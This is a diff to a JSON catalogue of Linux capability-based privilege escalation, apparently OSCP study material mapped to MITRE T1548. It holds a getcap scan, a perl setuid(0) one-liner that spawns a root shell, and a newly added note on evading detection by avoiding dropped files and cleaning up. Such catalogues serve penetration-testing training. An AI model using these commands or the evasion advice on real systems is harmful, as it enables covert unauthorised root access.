@@ -32,11 +32,11 @@
       "command": "sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic"
     },
     {
-      "label": "OSCP Ch17 \u2014 recursive getcap scan from root (spot cap_setuid binaries)",
+      "label": "OSCP Ch17 — recursive getcap scan from root (spot cap_setuid binaries)",
       "command": "/usr/sbin/getcap -r / 2>/dev/null"
     },
     {
-      "label": "OSCP Ch17 \u2014 perl cap_setuid exploit: setuid(0) then spawn shell (GTFOBins)",
+      "label": "OSCP Ch17 — perl cap_setuid exploit: setuid(0) then spawn shell (GTFOBins)",
       "command": "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
     }
   ],
@@ -104,6 +104,7 @@
       "HTB M25",
       "MITRE T1548",
       "MITRE T1548.001"
-    ]
+    ],
+    "evasion": "Use the GTFOBins invocation that runs in-place without dropping files; clean up any temporary payloads; a single setuid abuse is quieter than repeated attempts."
   }
 }
